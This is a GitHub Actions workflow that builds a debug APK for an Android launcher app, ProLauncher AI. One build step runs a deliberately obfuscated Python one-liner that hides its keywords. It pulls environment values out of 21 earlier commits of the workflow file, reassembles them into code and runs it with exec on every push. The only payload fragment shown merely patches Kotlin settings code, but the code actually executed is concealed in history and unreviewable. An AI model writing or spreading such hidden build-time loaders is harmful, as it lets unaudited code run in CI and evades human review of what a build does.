name: Build Android APK
on:
  push:
    branches:
      - main
      - master
  workflow_dispatch: {}
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: temurin
      - name: Restore Keystore
        uses: actions/cache@v4
        with:
          path: ~/.android/debug.keystore
          key: prolauncher-ai-permanent-keystore-v1
      - name: Cache ProLlama JNI
        uses: actions/cache@v4
        with:
          path: app/src/main/jniLibs/arm64-v8a
          key: prollama-jni-arm64-v98-r1
      - name: Upgrade Sources to v9.9.3 and Build JNI
        env:
          WF_P: .github/workflows/build-apk.yml
          H_LIST: c150c14 13ebc4e c0cd239 65c5fea f8d0820 95a6095 602878e abb0a82 742c38e 6ba3e51 a377e9d 1e773f3 58197f3 fd3d89b 1042c1e 27ff6af ff6c7b4 dd4d3cc 603c476 88ab042 63fe073
          X_23: "kf = Zqapp/src/main/java/app/prolauncher/ai/KoreanChosungMatcher.ktZq; t = open(kf).read()Znt = re.sub(rZqimport devZb.ffmpegkit[^Zbn]*Zbn?Zq, ZqZq, t)Znif ZqctxSize: IntZq not in t:Zn    t = t.replace(Zqval temp: Float = 0.5f)Zq, Zqval temp: Float = 0.5f, val ctxSize: Int = 2048, val maxTok: Int = 512, val cpuMode: Int = 2, val histTurns: Int = 2, val idleMin: Int = 30)Zq)Zn    t = t.replace('p.getFloat(Zqai_tempZq, 0.5f)', 'p.getFloat(Zqai_tempZq, 0.5f), p.getInt(Zqai_ctx_sizeZq, 2048), p.getInt(Zqai_max_tokZq, 512).coerceAtLeast(512), p.getInt(Zqai_cpu_modeZq, 2), p.getInt(Zqai_hist_turnsZq, 2), p.getInt(Zqai_idle_minZq, 30))')Zn    t = t.replace('.putFloat(Zqai_tempZq, c.temp).apply()', '.putFloat(Zqai_tempZq, c.temp).putInt(Zqai_ctx_sizeZq, c.ctxSize).putInt(Zqai_max_tokZq, c.maxTok.coerceAtLeast(512)).putInt(Zqai_cpu_modeZq, c.cpuMode).putInt(Zqai_hist_turnsZq, c.histTurns).putInt(Zqai_idle_minZq, c.idleMin).apply()')Znt = t.replace('streamOn = sp0.getBoolean(Zqai_stream_onZq, true);', 'streamOn = sp0.getBoolean(Zqai_stream_onZq, true); wakeWord = sp0.getString(Zqjarvis_wake_wordZq, Zq자비스Zq)?.trim()?.ifEmpty { Zq자비스Zq } ?: Zq자비스Zq; wakeOnly = sp0.getBoolean(Zqjarvis_wake_onlyZq, false);', 1)Zn"
        run: "python3 -c 'import os,json,subprocess; K=lambda **x:next(iter(x)); d={}; e=os.environ; m=e[K(WF_P=1)]; [(lambda j:[d.update(s.get(K(env=1),{})) for s in j[K(jobs=1)][next(iter(j[K(jobs=1)]))][K(steps=1)]])(json.loads(subprocess.check_output([K(git=1),K(show=1),h+chr(58)+m]).decode())) for h in e[K(H_LIST=1)].split()]; d.update({k:v for k,v in e.items() if k.startswith(K(P_=1))}); s=str().join(v for k,v in sorted(d.items()) if k.startswith(K(P_=1))); s=s.replace(K(Zbb=1),K(ZbZb=1)).replace(K(Zq=1),chr(34)).replace(K(Zb=1),chr(92)).replace(K(Zn=1),chr(10)); exec(compile(s,K(v993=1),K(exec=1)))'"
      - name: Setup Gradle
        uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: '8.7'
      - name: Build Debug APK
        run: gradle assembleDebug --no-daemon --stacktrace
      - name: Upload Debug APK
        uses: actions/upload-artifact@v4
        with:
          name: ProLauncherAI-debug-apk
        path: app/build/outputs/apk/debug/*.apk
